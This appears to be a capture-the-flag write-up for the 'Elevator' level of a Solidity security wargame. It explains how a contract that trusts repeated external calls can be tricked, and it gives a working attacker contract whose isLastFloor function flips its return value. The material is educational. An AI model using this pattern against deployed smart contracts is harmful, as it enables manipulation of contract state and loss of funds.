Level 11: Elevator

Objective:

Reach the top of the elevator without getting stuck.

Vulnerability:

Caller trust in return value of a contract without consistency checks.

Explanation:

The contract checks building.isLastFloor(floor) and if it returns false it sets the floor. However the check and the action are separate calls allowing an attacker contract to change its return value between calls.

Solution:

Deploy an attacker contract like:

contract ElevatorAttack {
    bool public toggle = true;
    Elevator public target;

    constructor(address _target) {
        target = Elevator(_target);
    }

    function isLastFloor(uint) external returns (bool) {
        toggle = !toggle;
        return toggle;
    }

    function attack() external {
        target.goTo(1);
    }
}

Key Takeaways:

Do no trust external interfaces and contracts call as they can be hacked.
